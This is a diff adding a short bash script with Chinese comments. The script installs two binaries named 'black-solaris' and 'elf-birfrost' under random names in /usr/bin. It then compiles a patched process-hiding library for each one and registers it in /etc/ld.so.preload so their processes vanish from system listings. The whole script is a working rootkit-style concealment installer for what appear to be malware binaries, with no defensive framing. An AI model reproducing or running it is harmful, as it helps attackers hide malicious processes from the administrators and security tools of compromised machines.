@@ -1,0 +1,25 @@
+#!/bin/bash
+blacksolaris_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+birfrost_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+filetype=`cat /dev/urandom | tr -dc a-z | head -c 3`
+
+#生成随机文件名的配置文件
+echo 'blacksolaris='"$blacksolaris_random"'.'"$filetype" >> /config
+echo 'birfrost='"$birfrost_random"'.'"$filetype" >> /config
+
+#导入环境变量
+source /config
+
+#开始更名
+mv black-solaris /usr/bin/"$blacksolaris" && chmod +x /usr/bin/"$blacksolaris"
+mv elf-birfrost /usr/bin/"$birfrost" && chmod +x /usr/bin/"$birfrost"
+
+#开始制作Hider
+unzip hide.zip
+sed -i "s/mjolnir/$blacksolaris/g" `grep "mjolnir" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$blacksolaris"'.so'
+echo /Hider/"$blacksolaris"'.so' >> /etc/ld.so.preload
+
+sed -i "s/$blacksolaris/$birfrost/g" `grep "$blacksolaris" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$birfrost"'.so'
+echo /Hider/"$birfrost"'.so' >> /etc/ld.so.preload
